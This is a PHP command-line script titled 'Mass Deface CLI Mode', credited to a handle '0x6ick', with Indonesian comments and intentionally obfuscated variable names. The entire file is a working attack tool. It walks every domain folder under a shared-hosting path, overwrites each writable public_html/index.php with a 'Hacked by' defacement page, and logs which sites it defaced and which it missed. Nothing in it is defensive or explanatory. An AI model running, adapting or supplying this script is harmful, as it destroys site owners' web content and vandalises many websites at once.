#!/usr/bin/php
<?php
/**
 * Mass Deface CLI Mode
 * Author   : 0x6ick
 * Repo     : github.com/6ickzone
 * Desc     : CLI mode tanpa HTML + variabel semi-obfuscated
 */

date_default_timezone_set("Asia/Jakarta");

$_a = "/home/u141571231/domains/"; // Base dir domain (ganti sesuai kebutuhan)
$_b = __DIR__ . "/logs";           // Folder log
if (!file_exists($_b)) mkdir($_b, 0777, true);

$_c = $_b . "/deface_success.log"; // Log sukses
$_d = $_b . "/deface_failed.log";  // Log gagal

// Payload deface
$_e = <<<HTML
<!DOCTYPE html>
<html>
<head><title>Hacked by 0x6ick</title></head>
<body style="background:black;color:white;text-align:center;margin-top:20%;">
  <h1>Hacked by 5YN15T3R_742</h1>
  <p>0x6ick - Silent but Loud</p>
</body>
</html>
HTML;

// Eksekusi proses
$_f = scandir($_a);
$_g = []; // success
$_h = []; // failed

foreach ($_f as $_i) {
    if ($_i != "." && $_i != "..") {
        $_j = $_a . $_i . "/public_html/index.php";

        if (is_writable(dirname($_j))) {
            file_put_contents($_j, $_e);
            $_g[] = $_i;
            file_put_contents($_c, "[" . date("Y-m-d H:i:s") . "] $_i\n", FILE_APPEND);
        } else {
            $_h[] = $_i;
            file_put_contents($_d, "[" . date("Y-m-d H:i:s") . "] $_i\n", FILE_APPEND);
        }
    }
}

// Output terminal
echo "=== Mass Deface CLI by 0x6ick (Obf v1) ===\n";
echo "Time   : " . date("Y-m-d H:i:s") . "\n";
echo "Total  : " . (count($_g) + count($_h)) . "\n";
echo "Sukses : " . count($_g) . "\n";
echo "Gagal  : " . count($_h) . "\n";
echo "Log    : logs/deface_success.log & deface_failed.log\n";
echo "===========================================\n";
?>
